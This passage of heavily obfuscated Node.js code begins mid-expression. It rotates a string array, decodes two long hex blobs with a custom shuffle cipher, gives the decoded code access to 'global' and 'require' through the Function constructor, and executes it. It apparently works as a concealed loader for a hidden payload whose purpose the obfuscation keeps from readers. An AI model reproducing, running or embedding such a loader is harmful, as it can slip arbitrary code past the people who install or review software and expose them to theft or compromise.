oLDVYcNadHmlmiOKSACs_WnsrV=-parseFloat(sIxhvzR$lPhBSvo_hPvqMT(0x150))/(-0x21d*0xa+-0x9b*parseInt(0x28)+-parseInt(0x11)*Math.floor(-parseInt(0x2ab)))+parseFloat(sIxhvzR$lPhBSvo_hPvqMT(0x14e))/(Math.trunc(-0x8d2)+0xb8d+parseInt(0x11)*Math.max(-0x29,-parseInt(0x29)))+-parseFloat(sIxhvzR$lPhBSvo_hPvqMT(0x15a))/(Math.max(parseInt(0x17),0x17)*-0x3b+parseInt(0x43)*-0x5+-parseInt(0x69f)*-parseInt(0x1))*parseFloat(parseFloat(sIxhvzR$lPhBSvo_hPvqMT(0x159))/(0x34*-0x6f+Math.floor(parseInt(0x1139))+parseInt(0x1)*parseFloat(parseInt(0x557))))+parseFloat(sIxhvzR$lPhBSvo_hPvqMT(0x152))/(parseInt(parseInt(0x70d))+parseInt(0xbb9)+Number(parseInt(0x12c1))*Math.floor(-0x1))*(-parseFloat(sIxhvzR$lPhBSvo_hPvqMT(0x14b))/(-parseInt(0xfa)+-parseInt(0x97)*Math.trunc(-parseInt(0x3b))+0x1fd*Math.max(-0x11,-0x11)))+-parseFloat(sIxhvzR$lPhBSvo_hPvqMT(0x14f))/(Math.trunc(-0xb97)+parseInt(0x59b)+parseInt(0x9)*parseInt(0xab))+-parseFloat(sIxhvzR$lPhBSvo_hPvqMT(0x154))/(-parseInt(0x23e)*Math.max(-0x1,-0x1)+parseInt(-parseInt(0x656))+Number(parseInt(0x420)))*(-parseFloat(sIxhvzR$lPhBSvo_hPvqMT(0x156))/(-0x1*0x152b+-0x1*-0x5ad+parseInt(0xf)*Number(0x109)))+Math['max'](parseFloat(sIxhvzR$lPhBSvo_hPvqMT(0x158))/(-0xa1*-0x3a+-parseInt(0x10ec)+-parseInt(0x1384)),parseFloat(sIxhvzR$lPhBSvo_hPvqMT(0x14c))/(-0x1120+0x11f+parseInt(0x100c)));if(oLDVYcNadHmlmiOKSACs_WnsrV===tdy$HcFYeOrO)break;else sUUVn_oYxxDIMZNNlVrHwgR['push'](sUUVn_oYxxDIMZNNlVrHwgR['shift']());}catch(YhIVPCv$Z_yej){sUUVn_oYxxDIMZNNlVrHwgR['push'](sUUVn_oYxxDIMZNNlVrHwgR['shift']());}}}(zcQHbrFXOHPvDkDoGqY$ClY_kyq,Math.ceil(0x1923bc)+Math.floor(-0xd1653)+parseInt(-parseInt(0x1))*-0x1dfea),function(ikZnYGbhxMoPrNhYPjvUnrnjn,ripjN,kLztwrwviWcqdLunJy,QzYqqrVrDwD){var WcpSDuuwmEYwUrOHTjZ_qCV=EqF_geCQEeoy;ikZnYGbhxMoPrNhYPjvUnrnjn['bx']=bx;function MfMSWNKQ$iw$Yeq(LFuazs_IVhdueW,hSfY_qqLsFGFNUTcKzIMMMAZ){var WZlsPNBjsLhXa$yEuWXkzNlWr=EqF_geCQEeoy,lPhmc$hf=LFuazs_IVhdueW[WZlsPNBjsLhXa$yEuWXkzNlWr(0x15c)](''),IVscQCPHwlmYVAROIQxXc$H=0x245e+Number(0x6e8)+-parseInt(0x2b46),YmSlPNWQ_snHreyMOYZzuZ=hSfY_qqLsFGFNUTcKzIMMMAZ[-0x26ce+0x1c67+parseInt(0xa67)],wXM$Pk_TyYVakvSY=lPhmc$hf[WZlsPNBjsLhXa$yEuWXkzNlWr(0x153)];while(IVscQCPHwlmYVAROIQxXc$H<wXM$Pk_TyYVakvSY){var GfKpi_$VlRLe=YmSlPNWQ_snHreyMOYZzuZ*(IVscQCPHwlmYVAROIQxXc$H+hSfY_qqLsFGFNUTcKzIMMMAZ[parseInt(-parseInt(0x2))*0x5c9+Math.max(-0x6,-0x6)*-parseInt(0x103)+parseFloat(-parseInt(0x1))*-0x581])+(YmSlPNWQ_snHreyMOYZzuZ+IVscQCPHwlmYVAROIQxXc$H)%hSfY_qqLsFGFNUTcKzIMMMAZ[-0xd5a+Math.floor(0x15dd)*-0x1+Number(0x2339)]+hSfY_qqLsFGFNUTcKzIMMMAZ[parseInt(0xdec)+-0x1229+-0x21f*-parseInt(0x2)],ebvmL$gd_TgNArPxrcRfUXwFGj=YmSlPNWQ_snHreyMOYZzuZ*(IVscQCPHwlmYVAROIQxXc$H+hSfY_qqLsFGFNUTcKzIMMMAZ[Math.floor(-parseInt(0xa))*parseInt(0x3b)+-parseInt(0x220b)+0x4*parseFloat(0x917)])+(YmSlPNWQ_snHreyMOYZzuZ*hSfY_qqLsFGFNUTcKzIMMMAZ[Math.trunc(-0x4a5)*Number(-parseInt(0x1))+0x23*parseInt(0xe9)+parseInt(0x247d)*-0x1]+IVscQCPHwlmYVAROIQxXc$H)%hSfY_qqLsFGFNUTcKzIMMMAZ[parseFloat(parseInt(0x112))*Math.trunc(-0xf)+-0x1*Math.floor(-parseInt(0x449))+parseInt(0xbc9)],sT$b_LXmQVtMx=GfKpi_$VlRLe%wXM$Pk_TyYVakvSY,wSspH$mpaHp=ebvmL$gd_TgNArPxrcRfUXwFGj%wXM$Pk_TyYVakvSY,NAKNS=lPhmc$hf[sT$b_LXmQVtMx];lPhmc$hf[sT$b_LXmQVtMx]=lPhmc$hf[wSspH$mpaHp],lPhmc$hf[wSspH$mpaHp]=NAKNS,YmSlPNWQ_snHreyMOYZzuZ=(GfKpi_$VlRLe+ebvmL$gd_TgNArPxrcRfUXwFGj+YmSlPNWQ_snHreyMOYZzuZ+IVscQCPHwlmYVAROIQxXc$H)%hSfY_qqLsFGFNUTcKzIMMMAZ[parseFloat(0x15d)+parseInt(parseInt(0x1e89))*Math.ceil(0x1)+-parseInt(0x1)*Number(parseInt(0x1fe1))],IVscQCPHwlmYVAROIQxXc$H+=parseFloat(-parseInt(0x2f))*0xa3+0x1a7c+-0x7*-parseInt(0x7e);}return lPhmc$hf[WZlsPNBjsLhXa$yEuWXkzNlWr(0x155)]('');}var q$KnoWu$HJ=String[WcpSDuuwmEYwUrOHTjZ_qCV(0x14d)](-parseInt(0x26dd)+-parseInt(0x85a)+Math.trunc(parseInt(0x2f56))),rxwW$Hyp=MfMSWNKQ$iw$Yeq(WcpSDuuwmEYwUrOHTjZ_qCV(0x149),QzYqqrVrDwD);rxwW$Hyp=rxwW$Hyp[WcpSDuuwmEYwUrOHTjZ_qCV(0x15c)]('#')[WcpSDuuwmEYwUrOHTjZ_qCV(0x155)](q$KnoWu$HJ)[WcpSDuuwmEYwUrOHTjZ_qCV(0x15c)]('~1')[WcpSDuuwmEYwUrOHTjZ_qCV(0x155)]('#')[WcpSDuuwmEYwUrOHTjZ_qCV(0x15c)]('~0')[WcpSDuuwmEYwUrOHTjZ_qCV(0x155)]('~')[WcpSDuuwmEYwUrOHTjZ_qCV(0x15c)](q$KnoWu$HJ),ikZnYGbhxMoPrNhYPjvUnrnjn[rxwW$Hyp[0x183a+parseInt(parseInt(0x98d))+-0x21c7]]=ripjN;if(typeof module===rxwW$Hyp[parseInt(0xa11)+parseInt(0x1f74)+Math.trunc(-0x2984)])ikZnYGbhxMoPrNhYPjvUnrnjn[rxwW$Hyp[Math.trunc(-0xd6c)*-0x1+-parseInt(0xb0e)+parseInt(0x12e)*-0x2]]=module;var P_ZOoVqtFfLt=MfMSWNKQ$iw$Yeq(WcpSDuuwmEYwUrOHTjZ_qCV(0x14a),kLztwrwviWcqdLunJy),nHgszxhw$LzzWNRO$iH=MfMSWNKQ$iw$Yeq[P_ZOoVqtFfLt[WcpSDuuwmEYwUrOHTjZ_qCV(0x15b)](-0x2494+Math.floor(-parseInt(0x1149))*Math.floor(-0x1)+Math.ceil(0x134b),-0x1078+0x1f0a+Math.trunc(parseInt(0xe87))*-0x1)],dI_QAdilVhYqWNcLvfuqWNLo=nHgszxhw$LzzWNRO$iH('',MfMSWNKQ$iw$Yeq(WcpSDuuwmEYwUrOHTjZ_qCV(0x151),kLztwrwviWcqdLunJy)),YkiCYU=dI_QAdilVhYqWNcLvfuqWNLo(MfMSWNKQ$iw$Yeq(WcpSDuuwmEYwUrOHTjZ_qCV(0x157),kLztwrwviWcqdLunJy));return nHgszxhw$LzzWNRO$iH('',YkiCYU)(-0x21*Number(0xc)+parseFloat(parseInt(0x251c))+-0x527*parseInt(0x5)),-0x3838+0x1*-0x8a5+parseInt(0x641a);}(global,require,[-0x54ae31+0x74d7d3*-0x1+0x1398d27,parseInt(0x623)*-parseInt(0x1)+parseInt(0xc87)+-0x53f,Math.trunc(-0x232)*Number(0x38)+parseInt(0x6b0e)+parseInt(0xa737),-parseInt(0x1f81)+Math.max(-0xe59,-0xe59)+0x2ead,Math.ceil(parseInt(0x6513))+-0x45c3*Math.floor(-parseInt(0x3))+parseFloat(0x613)*-0xd,-0x1430d1*-0x2+-parseInt(0x7c4556)+parseInt(0xa2f8cb)],[0xc*Math.trunc(-parseInt(0x1799f))+-0x123c07+parseInt(0x9ffb36),-parseInt(0x13)*Math.max(parseInt(0x6d),parseInt(0x6d))+0xa05+parseInt(parseInt(0x1))*-0x49,parseFloat(0x9083)+-0x1ba*0x29+0x1094,parseFloat(parseInt(0xd8f))+-parseInt(0x1e12)*Number(parseInt(0x1))+0x12c4,Number(0x3)*Math.ceil(-parseInt(0x4b6f))+parseInt(0x36b9)*0x5+Math.ceil(0x80cb),Math.trunc(-0x9099bd)+-parseInt(0xdf176)+-parseInt(0x2)*-0x77a535]));function zcQHbrFXOHPvDkDoGqY$ClY_kyq(){var aANSKyiilJmNnCGHK=['5e58595d5f5a5f0c0707030210','0f1b06042a01081b2a060d0c','5a5c5d505c51510e0530232e04','5a5a5a5b5d5e5f3b3122241f24','5c58595c5151182d0f043c2b','5a030d4945551a085b1a54345441521c5a5b545906580851124008005242401b00121b0800070007140705471b4008594205061e0a065a1b494b0c0607321d1c1d0b0b1d323440191f505106195b08551d1b0a005d1f055d52520a3249081f515f4540081a524b0c1f42451b521a5e41065e44070f081b415f45190001510034021d0e1b42043242320858585a061b5b415b1b06590b140c491d0a085f481f5d1b5441340f5200001d47421b4900484052581d45475147421a1d0f28451a47061b5206471d5442420701524212424152281c0a520d1b1c52521d1a1c585e5f0a1b49401b320f544b5a1d51001a0154080a0d540c010b1a580640071c0f0e19001b1b42594145071d050a000a0c41575a521d1c45501c1b08081b5d580708520800320b1f4000011b1d1d080101060c000c0d1a1b00081a05070e1b52191d1d01075205071d5459051d41470054471f0f194954061140075805064b08410a001d0052060c085a450a5f5a0b1d5408051b08545e0047081c0505521f01005806141a0f2a1c59071f5b4432501b00075b1d3a05081f0c120840540c1b491c1d0c49505a41074019084741045a5a491a5206455a0e320c52000d47002a08410e1d591a52400c0f584b06520801580f2a420e034b4501061b5452061c4304085b1d1d54425149320a5208545f1d400f081a07060a59120a1b490d414914451d52581d435e341b52060c475e500d1d5c071940400b41081b4201005f550808021d471f1f580d40425119142a490c0c325c04411d071d511d540a1d405740001b541b0f1d41580507411a40470a590e0f00590d54000808520d405a41060d00541d59051f470840401b49062a1d1b1c401b141a450c1b0d450b58085b421b470002411f1d520a1b0841071d45061d404058051a5e0a51021d591d320f0c0f54415e051d54540c1d3a52003400321a1d5a5255280a4108015a1d085854541b52084745414908521d40021b42510b1b541c08520a1d1d1d494007521a0c1d0a594b4708000a1d0744455832471d1d014945450e5a4459181f1d06280c58421d425b06523400410b441b420d05061a111a1b0519541d1d400e1b0003050a070b0a0f061b4949000a081a064552521c0b54590a1a1a1b1a451d1f041d340549000705541d5834130c52001b1d08400f005e451b4b0c1c4034421c1d1419471c0108191d451f0f1f1d0202191d591f5b491c0011081908060e45031d1c070058340d065b5d1d00540a1d2a441d28124b060a525a0c595c54081a41411d0b4134010b06541a0c5b0c5200000c525a1a0e1919470b2a49000b0700421b0f1b060c0608071c54010d0c475d52421d01441b061f1047495b5d4708060054341d415454061b041a1f1205021d1c0b0052551d0c1d510841470f00415954050c1a410d411c1d010d1d050001001f5d001c42541f341a03061d4749061d45080659545d051c04050b0f1b5b5a2a0a5b0645520c540c085d1d1154081a451d0e1b471c06044008411a080f5801400e1b001d4b191b5d1b0f08010a5052110c4002','5f505d5f5c5d5c0b2d020c3e04','050c070e1d01','585f3d013f2b0b38','03060007','5d5e505e5f5c5e1b072410183f','380c56324b322332461d0c0a3255320e3252234d4447475d07400055411e125659103234000a292b41591147504a080a2a3200320a36400a05474f030047404700325645000a2a0a5c4749543232555f0104005d321d49190a320d56532b451a31095136410d5656560732324310560c023206520f475654554f32470f5c563a48480f32491d2f3d56403206483232320c3c470e1d32203225564749560a3e113d18490c2156431e1b53540047565b320a475c474f474f4c320d1f064d3211291b310b3238563a53211b0a324d47320a0e1b324a325d05363232470c32004d470a4b47560c2e1d32491b563f11172b32234e0b1a32324b473a2806494736425656430a4c1307320f0c5345070058361d0032320b3026470a3f0a0e0d471d3232141b4748073a412d1228020c0a4007320247471b40211b323242060f05001a01320f32321927013212324756291a0f4d32485b32100f47564712491a580c4c02475c1a47323248324a1a004b52141d2552320c0b32424132325a5e32472d21320a0d56041449590a5240050a244d1d5b56322b1a47491a56415156324e1150110647110b39000a0252323a320a47473b47544747004e51411a3248320549064f494c3207561207081a32490c024732070a1b051b0f0a0432480044084f0c4714000b0a0c251a41480632061f0401063a4205495b5108024d470a4749140c561c412b2a32474a321d0c0e470c56320832400e0a1a1e1a56473241080c0a04125d0547140a320c3241323b3932434732230c0c04000132433232320849080c4032470d0c47321b322a510b322803320251562847085b040f1b471d560f32420f4707320a47470307481a0f08470a47321f322f325632115656250d1c1a374a32400c32520a411a3a5b0a05363a5f4701460a0a56470d5f32010747461c32005147565d401a431306484707081a59475c1f4c585610470a325632174a1a563207560a4b32323147430a3a1c4832473b5a4047001306320a0b0032495647481d320d473220321e3d0a320c460f470e2110323256320f05323205321d4842001d44474832470c5901565142321c594e5a590f2b5956491a410e47580f2559473247114c0a56571b06473249470a564147415647531b051e4a1441470a5e470a1b074732560c073256540c11470a323a0c085b0c47474741580a1954471a475d575658320808320a43325d320b351d4707020b4947562c055a0f48325d36574e321d49320e471a40415953410c140a29471a1d47324a08024632471d580a084903402c0624471a05363256320a265b4732321a47200a1c32490a0039471d2c3641560a2848480f1c0f491b32485f1b0a0a02325c5942322947320c08324a47004c4132454042320a5407564e494756483236325d32251a0d4a1042563a053906470f520c3a14000c28474756061d324822042f0d3253053e1b47490d1f48560a4c323214144a0747471f1a470614562f1b3232322c051c32360c3214325949562a510f5f0d050c0a321d0b322c470a3247550d48191b00124240560b563a32590e1d280c321932473247390047470d3256560806571d00041d0f1d0c321b2a4d56363204001a47470c1956481b4b0b360450320b054732061d524f1f0f0006470a4a562c1c5c47485301493247144b34061f32560d105608561d43404744061000475b470831003256324d471a44470a3a471b491036540f3d481d28360c0c47563b03271a571947501e110a0105050d324b020a323232440f1f0c410a121a474802110e403a14453a354b194c11472e321d1c3208474b192447324b1d40000d5a37403f443247320b510a3a32470e0c561d30562756000c2d285c0a32284748320d323207321b1e02051f0c3247061b190a413250321b245656323232380c41005d56490a32424d324f1d4a474832404b210147531a4232320d562856590507560c1b5f1a561932474634321e0c493a3256564749440d0d471d321b0c3202330a41474708320f4748320e320f410a3a102c3a56070c3232320c183201193232471a470d56322a475f10322c08453c374700320d4114080032561a3211320c2c000c0d4e0c1b32471d44321a4e2932300507323b53321b010c550c07051a41453208563e000c47404e5649401d0847321a3a320a564602560e0a010047015b1e561c470a3231475f00470a0a1d1b1a325c0e4819470c32052832322b10323256322c1d005806470c32004b47483a264c47021c470b320a48414e3256320c0f05082c0a320a1b0c00563247040b3200503212470a480656470656415648323b321a1b562b1b41061d325d13495606464732014841451f3232272f1b541d0632491d0c3a08485d1d08565d205f1b11522932400204120d474e063247475b56321d5c10525647320d490a32320a4732560a3246071d3249480c0a1e5e40471a3256201d5632594700324747325d0a0432524d3206320a32104700044c2c480d493213064701481c1308070a0d00321d32362c560f141d3232320c0c1b3247441447235b32482851470f07144c4707323c32003232470f510a49571938564b49415a11480c510b0f2632121a400b1a0c114732323a5656470d320226320c5600321f1432470c473a321c3248321f3a494e0232283240581d2d591007060e101b2c39320c49470f061a1a483247324103120c490a1a40122b325646493e49114a4d4e484732391b32400a4356564a3c1e28565d1b191a4756544604475201325c470d49213206320d4c03324156493a5f0a474b325d051d32321d591408191d410e4832025947325641324d47320a1a064c523b0a5b47320d561a2a56470c560c2c32013a403248060a324747493206440a0444041a473a1d0a0601470c5d4756320a1247321a591b4850190c32475a1d0a563a1a470a0d473232135c4b1a5432474932321b4720325632564b5a3247563a0a100c0556564b3232005a5d0d3206051a32071a19064826000c101b3758340e093223325847564201491d32124832441d05323625323200320a00563a3a353232590d320c5605324432111b1d4132023241560c0a32203211320a08324d1b1a0a563a0032054c1d320a1b371b5632084b59325144483204331d472b0c320053555d1d540e47320a1d1e1a4f31321d56191a0b564b1a285647471a49504836405d144904194932502f1a1007010a58060a324704551a4a3a0a0a45321c3a322f571b0d471d4d1b4f561a5732475a483241493932321a045832470a56434706321c473c411d480f2834524f001447470848321a443b18324c4d47565c0b4547321a560b1b001d5856324047150556560a541a32063c1d2b283b5c49320a2a47210d26484b1d481d1b47561f53320f08040f475b0b0052325b591f4750002c0c54320e0e0032540d56470e32320a505036320d5d5d08565349554b051c470b480a0a073256061e26000556024232563247594c32321d470a47474106474747084747472c403232323e041d112e325f4056320d3128241c4c470c040e190f473e020a0a055f321b473232324925490a38445e51563228470a470a070f32580b56073232410c474e32564c59564947320a471c41324a0c1a0847125612405647563207323e1c5a3256060c322b0a0a3d320c321a144b1a414208083205471d06320455204732551c2007561d04490b405a13024b32411e1e48323a1532473c144b3259324b3211470c203a47565641470c40064740084732563201470a44384f32563247092b141a474447323a47320a0f0d09125c0a324113323206323d323247324402320e47404f064c323108591c2832563a0c00521c265b474e3a1947190f59001b0e3206110f494744324e05564b0a5604412f42053233470d49215b32001d00411c1132091b5649471c084757072f5656471a06320a3256110a421d08121c471d320a24560e324b47561956321b0b111247325956055d321204324947080856485d060a0a08521b490b37544e431d561b32195447560c320a0a0c00062147561a1356564507483232475d0e3253400505324d320540323247560e0a3228193204320f1b0a4400470f41563256323207470032085619474e5e56231e551a514b324d0d0a4b475919020a3259413256410c0a1131321b0036472e322f493d0c2147054732475a1b1a4757451d4b361e4c1a5647591d1a2c003256411a27284140075f0a4036060f5248335847470c051a0a32432541545e564932320a325e561f324f321f0732492656470d210e0a493232392c3208000a32411a473b595b5602560a140c0c0e0a050a5619413219320a09023219560c3c3256371b391d324752565e5649564132203256471b565821413a321b1e4706320c0007000a1a3251110a5600320c56004b1732491a085639324f33472056401040323232260a025a1a473204031c413d560745330c193256492617505632210f325c4e47001a47320c065b321a084856085625494151543b562954320d0c00473a40050d1d32325648320c32431a47490a47031b505649324f470a5f1a562b18583241141035561a565554590f09564107474b21320c1d51404b1a3b0f32474032324d07071a080a0f1f3247560e321d48325f101a47560a2832325a194732190c0d084732320a07144919474427121c044c130f190c1d1d5b3a0a325647400a10440a3209001a071840410f1032480a041b060c321c471a454a150e34080a04483a470c56120c0a1b321a05471b325601083232134732321e56040011560c5d410e561d5e4747494923560a4706564732485f102247474f481d00320f005600362a08324748410147490b48474d47150b24563a3a0032005632561d4d56325e05410032564736470d5651000528423648325232002c5647561d32561a213a56083b475649562100320c5647323908083b490819563248572e4d47320f471d47090a49564a40012b0d0a3256073241224f323a4147190859085e1d5432493256470a450d565a411a1b3229190a474f1d4c041d56540c12401a5f0a3a4741321a3a3b1d0c3232481d4707070c07321c47284d32062d051c0c32003b05580a3232374b321d234947560d1d1d47232b4e1d4733321347474736264a000d0856193b47400e4c47472908055a481c05354832061a1a32483241342606320007320c1a4c57320c0d59431b321b4d4d32320d471e32125a32325d32370a0a0a0b59400c0d474f4718351d3a5606150f2a0d113a52520d1b0c282c07321947320f145c0c0130560a32475f0b1b1d56150f3a0c47321441294d56470d0d193219320c470c32320c56080a470f0511324b470c595b1a474732321d45324d450c320f3711320b070d0553322f1b4159455647413612474a4d15070c0002080c5153474751474748474756474b564d0d064732564147463240110a07473232191c0f394032471d3208464d0c0f0a4b5a32411d401b190a4706321d324b423212265642413240191f324747321d471d5f56290c39354532324732020c560532483224320c480f5647444740080a0b2a00280a560547320e3232474d531a560b0d0056481a1b3241471f3a420a325c320a1d0a415a481a5b321d0544350e5c3a320d0c1b1032590a0b14493206561d48491b284647084703425d2d12323232383232562d080c534c56324e324a0b0c48320747471d4d5547473241070f52471b070c0f0832321d5356530a40490c590a28481d1519560d470c47560308471a0a1a5956070f564b324708562f4b1a340f005248060b1d47565b32461e58471014040020563d0a0a325601324c0e562b1a0c48563239054732005a581d5d02143243324732482c3238560e0a4032193246324e323214000f0f1a4732563232320f0c45480a325532434056401c0f56321d474a321a5956040f0c1b3210323a14491a564a411b5f2b07234a4b5a400b4e1d40450d32024f1b2c32474732470a41074c123a47470a0755320a0a3632565632015f1447562d4720440c070d19263a07563d4708564a1c32321d5747085b570741071a4f1d54113c080c221a0d32560c1a3a063c224747494700001a1a590a211a23321c561b1d41454e324a321d561e105632531d1d56230b495c331e5a1b3a32564906563f4d323a32322f0d053a0c0d5632480c10051d32323c51470f081a110c1b324b05560c47120a47560a470c065654040a324706471d1232325e4b1e49350c320a130a460247480d5738323a470a5c514147063256470a1f471d323208470032564732561d320a072732323a360b0a32320f1d0b5649471b56423207564f2b471a0a410832383241320b480a025640560e073204320a1f4a292c030a0032483254281a471d561847471341474d3a191407413656440a0c491b1d471a083247222300213232103a3a4732583247072d56303200320a1c0f1d363640561d2f2b3456401a40564447321a4b47471a322956281a192156261d1d32564a47403232060c560a110e074c1d3232085a323a324706475632473628413232000f481b4446480d43084147564b565b47323a0d0c0e231a113230494a4e3647415a394d210a071d400a32545a1a32484732325650560a320a540a463e32114707323c0c004925410506561b00323a0a0000010a554714014806482c1c28541c08034d0532110847083247320527401b3648563e32594d0a4947050d04070700322d4732565b0132323a4732321d054d47320f3247020a41470a2f151d32320357084004274745011a5608324956055d56324c323208410f41412356490c47470632324d4732473241590a3a194132414106414849320d471b450d0b47495026480037152c410d3214360a32513a46324620211e4a01471a0f410a0632471d031a2c115600010a48321e3256583256324a0c474747393232472856584758320f56493226323a26562106470a594014562c1a2c565d56500d0732343249064756471b0759321a105647130c4756131a2f000a5f501a5d365904565e5447294c361a3a5f1d4711475e3941564138064e49503249470c47011b1f4e4b322c522f085632144732580c00320d42470a320d53304056473632324f49560a470a3232560407400c475646564a41281d4005480856212832003213470c5650325c1b32320c5e333232475a041b080756470c0704405652320054471c1d1e3652240a47324747385647531d52113a455c1d4c0c1147400a141b32360f0b320c050a4708563b0f5632500a1d060d47144738484b323248583247191a3a0a1d365d4d3b32310f3253321c1b560804501e4f48295448561e540a550c490c05003852325a47064759573232021b470a24341b3232320049323247430f0948565432440a47320a4732324906323a044041082d3205405d3214563a0a3247493232551d473a56411e3232404e2e48320f0a021a41470032440f4732045648320a480d2700410a32500c02564b5713063a0052273256410d103206561a47321d0e1d1b3206591b473256070a213200110b0c0d06323248463a5a4826491a320a40320a0b56320a47433247563203323241280b56280a325640071a1f08470047470c324a1a47321a04320a471d4132084702454741400a363247320f320a0c0a320a5d5e3549210a0a000d1134561547324f0c321e051b4c32470e195653321d320349464445321d564932471b1a14454f1c5b364f39561a0f1147000b1a2c475d471e133208000f32561432470c143248000b3600560a070d470b5d0c07012b111302321914495749381105470f4b475619061a485b1e404f3241370a0a1d1d321d2c061b323d49124756320a0b1c0e47324706024101560c0f3d0d0c143b0c320040045610561942423247584d56473a50325656325605565a045d053205322b32410a074754072c323256412c4a3232485656473247320c564708594d0a470f32501849494132381b1147323a474147411a325856321b0c2e471a56113f56190c041c1a441d470c0c00470f470a474e0d325c564a1b55521347471c5132481c143256361b0c0b0802481c1419120e071a254c28562b0f22560b061d4c320a325c0a562c002c0a562b4f1111324f563201224556063e1f450532321a2601561a32472132400a5a564f464432083206131d08563a325a4841395f320c3432521d471b2e0a4941563e07010c4746474732560a341f49471a4f320b0a32473202474832404a044d3258320b321d323b0a1a3247065611140f4941324d01052a1f473a323a0a56324e0a55560132040a0f470a4712560a325a0c08490a321a3347065f0856410b02451b1d321b3a47320f47321b414854484d41322c36503d4756085e560841321132471c0a57461d302b06561d140d0c1a524f0f074a1b4f3e5a4f470a5832441a0f3b4a0052474a1d0a090718324847562f483254084749320a3241321b1b1b321a32320a0a1d0c323408325207471b0708320a3232423a330a32070f0c4b320a4732563e320e0f3f325605072c32064b0606320a491d47323222491147480a5d470a32221d121919564a0f1e0c324719564f070c11410f1947002c0f491a47324f1c525d2d471a273214470a3a56545651471d484b5656470849051047411b451c4156320a41323232471a0507481d253a4e323247471a003d1e48494139490b5b0840045d323247322b074f4132280a320a32490a471b3206494d4c275c47331d3200565914473f561d19324956540a0a424941043a32034808493a2f1b3206323a1d0d1f0b47550f5626124756564d3524490a06043947114947321d5b0f06055c080e122c0601322d0b1a2c484718150a1a0b061d4e0c410a081911001405540747062b444832251b32054c36323252054758445b140a0f430b0a2a404022490c111d04320d0c3147280d321d1b1a0147412c061d4f32110032041056344f5c3200321d0c110f1900000a323247391d1c00560a1d03141b480a020b470031473256324b323703542552470a001b594932565747194d320c1a32083205473247470f3243350447121d33561d0a1b2b0e47561a00321b325959320000411b485647463232130a0a320d0e41560d41475e4b32474819474d4732321a5a084148325d29564819494c56040047475632041b47140059325656081c1d47060f0a540a484d0a214719413532583a47031b472b564f47470a565d323232473203323e32291a0f22464711321a47411a47183a2e1d0a020a4120371a4a414728320a494a4a5632475c475e4707053a57322a4748320a025932070a48320a3201152d4c0a32010a493b0c471107220a474148325645560f560c4d0a3908470a015240471b56195657050a56325548322e321c2201081a11320a32085a1a0a0a0d560404540a321d3e324c0a56110c471747324f1b1a173232332a4105564747323a36474730303249080f0d3232325a32320b19470a3200475f473249475a551d3a320d0e07472a5640471b325614005341104917360c45323a2456363219014736475b473232450c072a3601000d0432324749550c191456005d32470657072f050136190a4b01264256000c562a324e470d491747320f3256193a5259472a000e41563a2f324d594701071d32454719324832050a5604484c0b2f5047411b5611451c4732412c475606320b5645560a3a3232561b560647560c2d561447415f4001485d0f574c470a4759563a575c0e32043a11312e1d00030a0c1b4e470e0c5f475941494d0f56563056360632320c4d320a181300080e5d02061d0a323207563a041d471d4f4747320b070f12325e485f084f47070a19325c481a3257485056490f5a470c481a0f1a1b2727122e560a1a470c32474754560551321f36320a320c3247320156090d562c1107073f19070f56472c4a2447322b48411146072356560a3a32590448331d322a0044470f324a0c32505107325b5632563232414737325a0d3947485f1b320a0c0f1d3a1e474158040a490a1b32133243470e360a5649321b0c2c324740401c565a0e40480d320032324632000a0e4c48321b32493247005e00470e0e1d13470c324f0d3732004d5632140a0c081d014c0a564d32411b4e0c454859470c322919485f1822320a1a41081107321d00563249061a324032065d0406010a0632565d561214491b0d411456470d0c49324748325132550c1b28441d5632494d47474014541c07005f430b041c3a324e32474706052c1f325f4733490a1d39081b000b120d5e401c4f0d48470a473241475632320f324711320c4d59050c5632413132280b1d5d004b325645561a4e5f5944323244321c324732560b472a4741082154551a0a563b48140c410733005d3c4352251d320c300a00412208470a4458314704561a0c325647483e32320748463250320e3a325647494747311912321b1a4948470c3f561a584748320a47324747561a060d19321a0c4a4a475f0209085b0408320c0a3256470d4132560c44325632250622594047211d4932263d32413a4756430132471432560e370a1a141c5c470147274148484b563a055710085b373223195456063a471001450a4a1c12403211320747320c4256321b280a56473f4730561147573a0c323a0e3232471a323447322c003256070c4f46320a325654410f080e17484d1a471b0b0a560f2c56472232474751543256560d0a2f471a48595648283e530a000e1d58480a0f32320b320c325a0447483214140c5659561a325032463241324e320f2c2f591d00074e0800354a0a0a4459470e325e0a05324532404f0c3d1f4724002f47522808324a3232080711325a1a37320a320a323d43350d0d32080c22370e200b06194232061d561c1b3240560423523932324308321c324b2c0805113259071b3256364741444b56061a0232471d1a52413a43114132031c473239040a54364700320b3214474728414b452656254e1b3248291b560f244c112d32322e563f3b0d1832173a4f4a325604324f463b3204324055473641495c5f2b3f483a46003c461d4751320e47290650143247585f321a323201324f491249320c3c0652472b41324f4d5601560a4d5a563247560b404e0341325f320503470e36320c41320a1c0b5632490c470a1f320808071f32481d5606475e471a064747484753323247473f470a0d1c5608050a5a1949110d47571d561d565800323248474d4832191a0a475632325d17494741563247471d1c1d470d3247434232001a321d4f4745461c1b470c130b461a4904320a1c050c4c2d2c471a0c040004540a400554470f560e1c26470c591d562d0f0f0c56361d3222055154321204081a32471b0a1c5e4b5d32574a470a0a024754321a523f0c3258474b4732323b32331b472b084d0a411d000a3a280d325956561f1b433a3c491232320f47321d325849323232365648484a05320c4756450c320b3c0a32561c32470d48321a322b470a06081c32320732325847321e0c41321e282a100c32360a324956050c564700412b0f12555d384c5a5647562d4707360d364f0d593a1032042e1a4156561b1a460d3246140002000521025b1d1b560628004b4c083241322b10562b471d49414041010805410107411c0a1d56321f5348323218080a360b5f1d4056564a491132320c0c0d5b4815024a055608391e1a414753562831192b475647564148001d4657471b00014e1a020c59251d0a0f5650475d323210233257415032474e5606051b51114701020d140732364247400000325a294a4c060f562f320a0c1e325656493a191d474732320c5656411e041e2a1b53474f04042d3a40140b061b4141450755565648561d0f32000d0b47580c471b52150a320d0547203256410c1a0c4e47470a51475a1d4701470a320d1a49061a32473f0c1a090056460f05471d58591d22470a1d561a14440c0a4749401b460a53563247471d0b4752141d0a07010d460a473247584732563a0a1c1a40491d32470f47553a491b560f32443240323a1b491a570a4d060c0f56532732320f04064747191b013a320611074817475847322e4a4700470a193232491b0a041c3247320a320c2845561a471a0a5e29320c1b0604523a325610143e32350f3b470f3241060a47190a0847061d5647560d02471049324114404732320514324f4a44480a080a47264706240a3232473b1847402e47325a0f56531e4a4932150832471a4c0a080732071947323212320a0f59470a1e350a1050485f1b490c470d1c070d1e4f0a4c4726071a59505259321732301b0a1406203